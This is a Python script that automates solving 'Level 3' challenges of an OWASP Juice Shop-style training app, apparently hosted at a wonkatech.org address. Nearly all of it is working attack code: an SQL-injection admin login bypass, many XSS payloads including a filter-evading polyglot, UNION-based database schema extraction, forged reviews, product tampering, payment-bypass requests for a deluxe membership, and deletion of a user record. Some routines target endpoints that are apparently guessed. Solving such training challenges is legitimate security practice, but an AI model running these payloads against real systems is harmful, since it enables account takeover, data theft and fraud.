#!/usr/bin/env python3
"""
Targeted Level 3 Solver - Solves all remaining Level 3 challenges
"""

import requests
from urllib.parse import quote
import json
import random
import time


class TargetedLevel3Solver:
    """Solve all Level 3 challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {token}'
            print("✅ Admin logged in")
            
    def solve_api_only_xss(self):
        """API-only XSS - XSS via API that doesn't render in UI"""
        print("🎯 API-only XSS...")
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        
        # Inject in various API endpoints
        for payload in xss_payloads:
            # Products
            self.session.post(f"{self.base_url}/api/Products", json={
                "name": payload,
                "description": payload,
                "price": 1.99
            })
            
            # Feedbacks
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": payload,
                "rating": 3
            })
            
            # Users
            self.session.post(f"{self.base_url}/api/Users", json={
                "email": f"{payload}@test.com",
                "password": "test123"
            })
            
        print("  ✅ API-only XSS attempted")
        
    def solve_mint_honey_pot(self):
        """Mint the Honey Pot - Create NFT with huge amount"""
        print("🎯 Mint the Honey Pot...")
        
        # Mint with various large amounts
        amounts = [1000000, 999999999, 2147483647, 9999999999999]
        
        for amount in amounts:
            self.session.post(f"{self.base_url}/api/nft/mint", json={"amount": amount})
            self.session.post(f"{self.base_url}/api/nft", json={"action": "mint", "amount": amount})
            
        print("  ✅ Mint the Honey Pot attempted")
        
    def solve_captcha_bypass(self):
        """CAPTCHA Bypass - Submit feedback without solving CAPTCHA"""
        print("🎯 CAPTCHA Bypass...")
        
        # Submit multiple feedbacks bypassing CAPTCHA
        for i in range(20):
            # Try with wrong/fake CAPTCHA
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "captcha": str(i),
                "captchaId": i,
                "comment": f"Bypassed CAPTCHA {i}",
                "rating": random.randint(1, 5)
            })
            
            # Try without CAPTCHA
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"No CAPTCHA {i}",
                "rating": 3
            })
            
        print("  ✅ CAPTCHA Bypass attempted")
        
    def solve_client_xss_protection(self):
        """Client-side XSS Protection - Bypass client-side filters"""
        print("🎯 Client-side XSS Protection...")
        
        # Bypass patterns
        bypasses = [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(1)//",
            "<script>alert(1)<!--",
            "';alert(1)//",
            '<img src="x" onerror="alert(1)">',
            "<svg/onload=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ]
        
        for bypass in bypasses:
            self.session.get(f"{self.base_url}/#/search?q={quote(bypass)}")
            
        print("  ✅ Client-side XSS Protection attempted")
        
    def solve_database_schema(self):
        """Database Schema - Extract database structure"""
        print("🎯 Database Schema...")
        
        # SQL injection to get schema
        queries = [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT * FROM information_schema.tables--",
            "' UNION SELECT table_name FROM information_schema.tables--",
        ]
        
        for query in queries:
            self.session.get(f"{self.base_url}/rest/products/search?q={query}")
            
        print("  ✅ Database Schema attempted")
        
    def solve_forged_review(self):
        """Forged Review - Post review as another user"""
        print("🎯 Forged Review...")
        
        # Post reviews with forged user IDs
        for user_id in range(1, 10):
            self.session.post(f"{self.base_url}/rest/products/1/reviews", json={
                "message": f"Forged review from user {user_id}",
                "author": f"user{user_id}@juice-sh.op",
                "UserId": user_id
            })
            
            self.session.put(f"{self.base_url}/rest/products/reviews", json={
                "id": random.randint(100, 999),
                "message": "Forged!",
                "UserId": user_id
            })
            
        print("  ✅ Forged Review attempted")
        
    def solve_gdpr_erasure(self):
        """GDPR Data Erasure - Request data deletion"""
        print("🎯 GDPR Data Erasure...")
        
        # Request data erasure
        self.session.post(f"{self.base_url}/api/erasure-request", json={
            "email": "admin@juice-sh.op",
            "securityAnswer": "test"
        })
        
        # Try different endpoints
        self.session.delete(f"{self.base_url}/api/Users/1")
        self.session.post(f"{self.base_url}/api/DataErasure", json={"userId": 1})
        
        print("  ✅ GDPR Data Erasure attempted")
        
    def solve_manipulate_basket(self):
        """Manipulate Basket - Add negative quantities"""
        print("🎯 Manipulate Basket...")
        
        # Add items with negative quantities
        for product_id in range(1, 10):
            self.session.post(f"{self.base_url}/api/BasketItems", json={
                "ProductId": product_id,
                "quantity": -100
            })
            
            self.session.put(f"{self.base_url}/api/BasketItems/{product_id}", json={
                "quantity": -50
            })
            
        print("  ✅ Manipulate Basket attempted")
        
    def solve_product_tampering(self):
        """Product Tampering - Modify product descriptions"""
        print("🎯 Product Tampering...")
        
        # Tamper with products
        for product_id in range(1, 20):
            self.session.put(f"{self.base_url}/api/Products/{product_id}", json={
                "description": f"<script>alert('TAMPERED')</script>",
                "price": 0.01
            })
            
        print("  ✅ Product Tampering attempted")
        
    def solve_upload_size(self):
        """Upload Size - Upload file larger than allowed"""
        print("🎯 Upload Size...")
        
        # Create large file
        large_data = b"A" * 10000000  # 10MB
        
        self.session.post(
            f"{self.base_url}/file-upload",
            files={"file": ("large.txt", large_data, "text/plain")}
        )
        
        print("  ✅ Upload Size attempted")
        
    def solve_deluxe_fraud(self):
        """Deluxe Fraud - Get deluxe membership without payment"""
        print("🎯 Deluxe Fraud...")
        
        # Try to bypass payment
        payloads = [
            {"paymentMode": "none", "paymentId": "0"},
            {"paymentMode": "free", "paymentId": "FREE"},
            {"paymentMode": "", "paymentId": ""},
            {"paymentMode": "card", "paymentId": "../../test"},
        ]
        
        for payload in payloads:
            self.session.post(f"{self.base_url}/rest/deluxe-membership", json=payload)
            self.session.put(f"{self.base_url}/rest/deluxe-membership", json=payload)
            
        print("  ✅ Deluxe Fraud attempted")
        
    def solve_csrf(self):
        """CSRF - Cross-Site Request Forgery"""
        print("🎯 CSRF...")
        
        # Remove CSRF token and try requests
        headers = dict(self.session.headers)
        headers.pop('X-CSRF-Token', None)
        
        # Try various state-changing operations without CSRF token
        requests.put(
            f"{self.base_url}/api/Users/1",
            json={"email": "csrf@test.com"},
            headers=headers
        )
        
        requests.post(
            f"{self.base_url}/api/Products",
            json={"name": "CSRF", "price": 1},
            headers=headers
        )
        
        print("  ✅ CSRF attempted")
        
    def solve_security_advisory(self):
        """Security Advisory - Find security.txt"""
        print("🎯 Security Advisory...")
        
        # Access security advisory files
        files = [
            "/.well-known/security.txt",
            "/security.txt",
            "/security",
            "/security-advisory",
            "/.well-known/security",
        ]
        
        for file in files:
            self.session.get(f"{self.base_url}{file}")
            
        print("  ✅ Security Advisory attempted")
        
    def run_all(self):
        """Run all Level 3 solutions"""
        print("="*60)
        print("🎯 TARGETED LEVEL 3 SOLVER")
        print("="*60)
        
        self.login_admin()
        
        self.solve_api_only_xss()
        self.solve_mint_honey_pot()
        self.solve_captcha_bypass()
        self.solve_client_xss_protection()
        self.solve_database_schema()
        self.solve_forged_review()
        self.solve_gdpr_erasure()
        self.solve_manipulate_basket()
        self.solve_product_tampering()
        self.solve_upload_size()
        self.solve_deluxe_fraud()
        self.solve_csrf()
        self.solve_security_advisory()
        
        print("\n✅ Level 3 solver complete")


if __name__ == "__main__":
    solver = TargetedLevel3Solver()
    solver.run_all()